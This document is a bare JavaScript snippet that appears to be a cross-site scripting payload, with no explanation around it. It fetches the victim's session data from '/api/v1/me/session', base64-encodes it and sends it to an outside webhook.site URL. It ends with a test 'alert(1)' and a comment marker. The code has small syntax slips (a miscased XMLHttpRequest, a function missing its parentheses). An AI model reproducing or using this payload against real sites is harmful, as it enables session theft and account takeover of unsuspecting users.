var xhr = new XMLhttpRequest();
xhr.open('GET', '/api/v1/me/session', true);
xhr.onload = function {
  if (xhr.status === 200) {
    fetch('https://webhook.site/cc677157-f70d-4a1c-a37b-2734b4c54ef7?x=' + btoa(xhr.responseText) );
  }
};
xhr.send();
alert(1);//
